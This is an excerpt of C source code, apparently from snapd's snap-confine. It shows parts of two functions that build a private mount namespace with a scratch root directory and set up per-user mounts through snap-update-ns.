   507	static void sc_bootstrap_mount_namespace(const struct sc_mount_config *config) {
   508	    char scratch_dir[] = "/tmp/snap.rootfs_XXXXXX";
   509	    char src[PATH_MAX] = {0};
   510	    char dst[PATH_MAX] = {0};
   511	    if (mkdtemp(scratch_dir) == NULL) {
   512	        die("cannot create temporary directory for the root file system");
   513	    }
   514	    // NOTE: at this stage we just called unshare(CLONE_NEWNS). We are in a new
   515	    // mount namespace and have a private list of mounts.
   516	    debug("scratch directory for constructing namespace: %s", scratch_dir);
   517	    // Make the root filesystem recursively shared. This way propagation events
   518	    // will be shared with main mount namespace.
   519	    sc_do_mount("none", "/", NULL, MS_REC | MS_SHARED, NULL);
   520	    // Bind mount the temporary scratch directory for root filesystem over
   521	    // itself so that it is a mount point. This is done so that it can become
   522	    // unbindable as explained below.
   523	    sc_do_mount(scratch_dir, scratch_dir, NULL, MS_BIND, NULL);
   524	    // Make the scratch directory unbindable.
  1019	void sc_setup_user_mounts(struct sc_apparmor *apparmor, int snap_update_ns_fd, const char *snap_name) {
  1020	    debug("%s: %s", __FUNCTION__, snap_name);
  1021	
  1022	    char profile_path[PATH_MAX];
  1023	    struct stat st;
  1024	
  1025	    sc_must_snprintf(profile_path, sizeof(profile_path), "/var/lib/snapd/mount/snap.%s.user-fstab", snap_name);
  1026	    if (stat(profile_path, &st) != 0) {
  1027	        // It is ok for the user fstab to not exist.
  1028	        return;
  1029	    }
  1030	
  1031	    // In our new mount namespace, recursively change all mounts
  1032	    // to slave mode, so we see changes from the parent namespace
  1033	    // but don't propagate our own changes.
  1034	    sc_do_mount("none", "/", NULL, MS_REC | MS_SLAVE, NULL);
  1035	    sc_call_snap_update_ns_as_user(snap_update_ns_fd, snap_name, apparmor);
  1036	}
